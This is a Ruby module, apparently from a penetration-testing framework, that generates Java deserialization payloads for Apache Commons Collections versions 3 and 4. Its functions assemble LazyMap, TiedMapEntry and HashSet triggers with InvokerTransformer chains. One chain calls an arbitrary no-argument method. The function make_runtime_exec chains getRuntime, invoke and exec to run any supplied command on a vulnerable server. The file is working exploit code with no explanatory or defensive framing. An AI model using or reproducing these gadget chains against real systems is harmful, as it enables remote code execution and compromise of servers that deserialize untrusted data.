
require_relative '../serialize'

module Java
  module Serialize
    module Payloads
      module Collections
        def get_pkg(version)
          case version
          when 3
            'org/apache/commons/collections'
          when 4
            'org/apache/commons/collections4'
          else
            raise NotImplementedError
          end
        end
        module_function :get_pkg

        def make_trigger(start, chain, version = 3)
          pkg = get_pkg(version)
          innerMap = JavaObject.new('Ljava/util/HashMap;', {})
          lazyMap = JavaObject.new('L' + pkg + '/map/LazyMap;', 'factory' => chain, 'map' => innerMap)
          tiedMapEntry = JavaObject.new('L' + pkg + '/keyvalue/TiedMapEntry;', 'map' => lazyMap,
                                                                               'key' => start)
          JavaObject.new('Ljava/util/HashSet;', 'elements' => [tiedMapEntry])
        end
        module_function :make_trigger

        def make_invoke_noarg(obj, method, version = 3)
          pkg = get_pkg(version)
          chain = JavaObject.new('L' + pkg + '/functors/ChainedTransformer;', 'iTransformers' => JavaArray.new('L' + pkg + '/Transformer;', [
                                                                                                                 JavaObject.new('L' + pkg + '/functors/InvokerTransformer;', 'iMethodName' => method,
                                                                                                                                                                             'iParamTypes' => JavaArray.new('Ljava/lang/Class;', []),
                                                                                                                                                                             'iArgs' => JavaArray.new('Ljava/lang/Object;', []))
                                                                                                               ]))

          make_trigger(obj, chain, version)
        end

        module_function :make_invoke_noarg

        def make_runtime_exec(cmd, version = 3)
          pkg = get_pkg(version)
          chain = JavaObject.new('L' + pkg + '/functors/ChainedTransformer;', 'iTransformers' => JavaArray.new('L' + pkg + '/Transformer;', [
                                                                                                                 JavaObject.new('L' + pkg + '/functors/ConstantTransformer;', 'iConstant' => JavaClass.new('Ljava/lang/Runtime;')),
                                                                                                                 JavaObject.new('L' + pkg + '/functors/InvokerTransformer;',                                                         'iMethodName' => 'getMethod',
                                                                                                                                                                                                                                     'iParamTypes' => JavaArray.new('Ljava/lang/Class;', [
                                                                                                                                                                                                                                                                      JavaClass.new('Ljava/lang/String;'),
                                                                                                                                                                                                                                                                      JavaClass.new('[Ljava/lang/Class;')
                                                                                                                                                                                                                                                                    ]),
                                                                                                                                                                                                                                     'iArgs' => JavaArray.new('Ljava/lang/Object;', [
                                                                                                                                                                                                                                                                'getRuntime',
                                                                                                                                                                                                                                                                JavaArray.new('Ljava/lang/Class;', [])
                                                                                                                                                                                                                                                              ])),
                                                                                                                 JavaObject.new('L' + pkg + '/functors/InvokerTransformer;',                                                         'iMethodName' => 'invoke',
                                                                                                                                                                                                                                     'iParamTypes' => JavaArray.new('Ljava/lang/Class;', [
                                                                                                                                                                                                                                                                      JavaClass.new('Ljava/lang/Object;'),
                                                                                                                                                                                                                                                                      JavaClass.new('[Ljava/lang/Object;')
                                                                                                                                                                                                                                                                    ]),
                                                                                                                                                                                                                                     'iArgs' => JavaArray.new('Ljava/lang/Object;', [
                                                                                                                                                                                                                                                                nil,
                                                                                                                                                                                                                                                                JavaArray.new('Ljava/lang/Object;', [])
                                                                                                                                                                                                                                                              ])),
                                                                                                                 JavaObject.new('L' + pkg + '/functors/InvokerTransformer;',                                                         'iMethodName' => 'exec',
                                                                                                                                                                                                                                     'iParamTypes' => JavaArray.new('Ljava/lang/Class;', [
                                                                                                                                                                                                                                                                      JavaClass.new('[Ljava/lang/String;')
                                                                                                                                                                                                                                                                    ]),
                                                                                                                                                                                                                                     'iArgs' => JavaArray.new('Ljava/lang/Object;', [
                                                                                                                                                                                                                                                                JavaArray.new('Ljava/lang/String;', cmd)
                                                                                                                                                                                                                                                              ]))
                                                                                                               ]))

          make_trigger(nil, chain, version)
        end

        module_function :make_runtime_exec
      end
    end
  end
end
